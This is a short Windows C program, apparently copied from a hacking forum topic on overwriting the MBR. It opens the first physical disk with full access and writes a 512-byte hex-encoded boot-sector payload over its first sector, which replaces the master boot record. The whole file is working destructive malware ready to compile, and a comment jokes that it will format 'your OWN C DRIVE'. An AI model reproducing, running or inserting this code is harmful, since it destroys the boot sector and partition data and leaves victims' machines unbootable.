//http://www.rohitab.com/discuss/topic/41722-mbr-simple-overwrite/

#include <windows.h>
//#include <conio.h>
//#include <stdio.h>

static const char binDump[] = "\xb8\x13\x00\xcd\x10\xfc\xb8\x00\xa0\x8e\xd8\x8e\xc0\xb4\x04\xa3\x90\xfc\x31\xc0\xb9\x48\x7e\x31\xff\xf3\xab\x8b\x05\x40\x40\xab\x88\xc4\x92\xb8\x00\x1c\xab\xb8\x98\xe6\xab\xb8\x28\x14\xbb\x10\x25\xb1\x0b\xab\x83\xc0\x16\x93\xab\xfe\xc4\x93\xe2\xf5\x05\x8e\x15\x80\xff\x5c\x75\xeb\xbf\xa0\xd4\xb1\x05\xb8\x04\x0b\xe8\x85\x01\x83\xc7\x3c\xe2\xf5\xbe\x96\xfc\x80\x7c\x02\x20\x72\x2d\xfe\xc5\x80\xfd\x37\x74\xac\xad\x97\xad\x3c\x28\x74\x0b\x3c\x20\x75\x04\xc6\x44\xfe\x28\xe8\x5e\x01\x81\xfe\x72\xfd\x75\xdb\x88\xf0\x2c\x02\x72\xd2\x34\x01\x88\xc2\x88\xc6\xeb\xca\x80\x74\x02\x08\x45\x83\xe5\x07\x52\x56\x55\x75\x0e\xb4\x00\xcd\x1a\x3b\x16\x8c\xfc\x74\xf6\x89\x16\x8c\xfc\xbe\x80\xfc\xb9\x04\x00\xad\x3d\x40\x01\x97\x72\x43\xe8\x17\x01\x81\xef\x42\x01\x8a\x05\x2c\x20\x72\x29\x56\x57\xb4\x04\xf6\xe4\x01\xc6\xad\x97\xc6\x04\x20\xb8\x08\x0e\xe8\x02\x01\x5f\x5e\xeb\x1f\xad\x09\xc0\x74\x2d\x3d\x00\xf0\x97\x73\x14\xe8\xe8\x00\x81\xc7\x3e\x01\xb8\x0c\x0c\x89\x7c\xfe\x80\xbd\x40\x01\x0b\x75\x05\x31\xc0\x89\x44\xfe\x80\x3d\x1c\x75\x06\xc7\x06\x92\xfc\x38\x0a\xe8\xc6\x00\xe2\xcc\xbe\x92\xfc\xad\x08\xc0\x74\x0c\x04\x08\x75\x08\xb4\x1c\xfe\x0e\x91\xfc\x78\x4a\x89\x44\xfe\x8b\x3c\xe8\xae\x00\x75\x2e\xb4\x02\xcd\x16\xa8\x04\x74\x02\x4f\x4f\xa8\x08\x74\x02\x47\x47\xa8\x03\x74\x0d\x83\x3e\x80\xfc\x00\x75\x06\x8d\x45\x08\xa3\x80\xfc\x97\x3d\xfe\xe5\x74\x07\x3d\x32\xe7\x74\x02\x89\x04\x5d\x5e\x5a\x8b\x04\x80\xfa\x01\x76\x0a\x05\x80\x02\x3d\x80\xd4\x72\x1b\xeb\xfe\x48\x48\x72\x03\x83\xc0\x04\x50\xd1\xe8\xb1\xa0\xf6\xf1\xfe\xcc\x80\xfc\x94\x58\x72\x03\x80\xce\x16\x89\x04\x05\x06\x0f\x93\xb9\x03\x00\xe4\x40\x3c\xfc\x72\x0d\xbf\x82\xfc\x83\x3d\x00\x74\x03\xaf\xe2\xf8\x89\x1d\xe9\xc2\xfe\x18\x18\x3c\x24\x3c\x7e\xff\x24\x00\x80\x42\x18\x10\x48\x82\x01\x00\xbd\xdb\x7e\x24\x3c\x66\xc3\x00\x3c\x5a\xff\xa5\x3c\x66\x66\x00\x00\x00\x00\x00\x00\x00\x00\x72\x02\x31\xc0\x89\x85\x40\x01\xab\xc3\x51\x57\x9c\x50\xbb\xa4\x7d\x2e\xd7\x93\xb9\x0a\x00\xf8\x88\xf8\x88\xfc\xe8\xe1\xff\xd0\xe3\xe2\xf5\x81\xc7\x6c\x02\x58\x40\xa8\x07\x75\xe0\x9d\x5f\x59\xc3\x4f\x55\xaa";

int main(){
    DWORD dw;

    // Use this for a drive to format
    //HANDLE drive = CreateFile("\\\\.\\I:", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  

   // Use this to format your OWN C DRIVE 
   HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

if (drive != INVALID_HANDLE_VALUE){

	
  DWORD size = 512;
  
  //printf("Binary file successfuly read!\n");
                    //ok,now lets write the contents of the binary file,to the first sector of the drive

                    if (WriteFile(drive, binDump, size, &dw, 0)){

                        //printf("First sector overritten successfuly!\n");
                    }
  
    CloseHandle(drive);
    //_getch();

return 0;
}

}